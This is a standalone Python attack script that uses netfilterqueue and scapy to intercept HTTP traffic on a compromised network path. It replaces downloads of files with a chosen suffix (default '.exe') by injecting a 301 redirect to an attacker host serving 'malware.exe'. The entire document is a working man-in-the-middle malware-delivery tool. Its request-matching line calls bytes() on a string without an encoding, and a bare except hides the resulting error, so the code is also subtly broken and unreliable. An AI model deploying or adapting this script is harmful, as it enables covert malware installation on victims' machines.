#!/usr/bin/env python
import argparse
import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = f"HTTP/1.1 301 Moved Permanently\nLocation: {load}\n\n"
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 80:
                if bytes(options.filename.encode()) in scapy_packet[scapy.Raw].load and bytes(options.ip) not in scapy_packet[scapy.Raw].load:
                    print(f"[+] {options.filename} found in request")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
            elif scapy_packet[scapy.TCP].sport == 80:
                print("HTTP response")
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing file")
                    packet.set_payload(bytes(set_load(scapy_packet, f"http://{options.ip}/{options.target}")))
        except Exception as e:
            pass
    packet.accept()


parser = argparse.ArgumentParser()
parser.add_argument("--filename", dest="filename", help="Filename  or suffix to replace", default=".exe")
parser.add_argument("--ip", dest="ip", help="Target IP address", default="10.20.30.40")
parser.add_argument("-t", "--target", dest="target", help="Target file", default="malware.exe")
parser.add_argument("-d", "--debug", dest="debug", help="Debug", default=False)
options = parser.parse_args()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
